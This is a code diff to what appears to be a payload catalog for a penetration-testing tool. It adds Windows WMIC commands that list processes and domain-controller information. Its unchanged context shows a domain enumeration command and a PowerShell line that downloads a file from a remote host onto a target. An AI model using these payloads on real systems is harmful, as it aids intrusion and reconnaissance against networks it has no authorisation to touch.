@@ -111,7 +111,8 @@ Load({payload: "net group “Domain Controllers” /domain", desc: "Prints the l
 // ################### WMIC ######################
 
 Load({payload: "wmic qfe get hotfixid", desc: "Get Patch IDs", category: "WMIC"})
-
+Load({payload: "wmic process list full", desc: "List all processes and their attributes", category: "WMIC"})
+Load({payload: "wmic ntdomain list", desc: "Get Domain and DC Information", category: "WMIC"})
 // ############### Powershell ######################
 
 Load({
@@ -128,7 +129,7 @@ Load({
 	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")',
 	category: "Powershell",
 	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		question.ask("Local path to save file?", returnToPrepare)	
+	    question.ask("Local path to save file?", returnToPrepare)
 	}
 })
 
